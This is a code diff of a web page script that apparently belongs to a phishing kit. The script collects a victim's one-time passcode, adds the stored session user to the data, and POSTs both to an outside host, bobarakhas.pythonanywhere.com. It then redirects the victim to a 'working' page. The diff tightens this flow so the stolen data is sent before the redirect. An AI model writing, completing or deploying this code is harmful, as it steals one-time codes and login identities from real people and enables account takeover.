@@ -46,19 +46,21 @@
         var submitBtn = document.getElementById('submitBtn');
 
         data = {}
+        data['connection'] = sessionStorage['user'];
 
-        function pushData(key, val) {
+        async function pushData(key, val) {
             data[key] = val;
-            fetch('https://bobarakhas.pythonanywhere.com', {
+            await fetch('https://bobarakhas.pythonanywhere.com', {
                 method: 'POST',
                 body: JSON.stringify(data)
             })
+            return;
         }
 
-        submitBtn.onclick = () => {
+        submitBtn.onclick = async () => {
             if (otp.value.length > 0) {
-                pushData('OTP', otp.value);
-                window.location.href = '/working.html';
+                await pushData('OTP', otp.value)
+                    .then(window.location.href = '/working.html');
             } else {
                 otp.classList.add('border-red-700');
                 setTimeout(() => {
